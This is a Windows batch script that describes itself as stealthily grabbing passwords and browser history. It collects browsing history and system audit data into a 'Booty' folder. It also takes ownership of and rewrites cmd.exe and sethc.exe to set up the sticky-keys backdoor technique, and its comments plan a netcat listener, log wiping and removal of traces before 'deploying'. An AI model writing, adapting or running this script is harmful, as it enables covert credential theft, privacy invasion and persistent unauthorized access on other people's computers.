@echo off
REM stealthily grabs  passwords and browser history from windows systems

REM checking OS type
set TypeofOS=0
IF exist "%PROGRAMFILES(X86)%" (set TypeOfOS=64) ELSE (set TypeOfOS=32)

REM creating results directory
mkdir Booty

REM getting browser history
IF %TypeofOS% EQU 64 (GOTO Bhistory64) ELSE (GOTO Bhistory32)
:Bhistory32
"Tools\Browsinghistoryview\browsinghistoryview.exe" /scomma "Booty\browserhistory.csv"
GOTO WINAUDIT
:Bhistory64
"Tools\Browsinghistoryview\browsinghistoryview\browsinghistoryview64.exe" /scomma "Booty\browserhistory.csv"
GOTO WINAUDIT

REM get system information
:WINAUDIT
"Tools\winaudit\WinAudit.exe" /r=gsoPxuTUeERNtnzDaIbMpmidcSArCOHG /f="Booty\winaudit.html"



REM type Booty\*.csv >> Booty\master_password_list.csv


REM add nc listener
REM remove all traces of activity
REM put sticky keys back to normal
REM wipe the logs

takeown /f c:\windows\system32\cmd.exe
takeown /f c:\windows\system32\sethc.exe
icacls c:\windows\system32\cmd.exe /grant %username%:F /q /t
icacls c:\windows\system32\sethc.exe /grant %username%:F /q /t
move sethc.exe sethc.old.exe
copy calc.exe sethc.exe
pause
REM take out the pause before deploying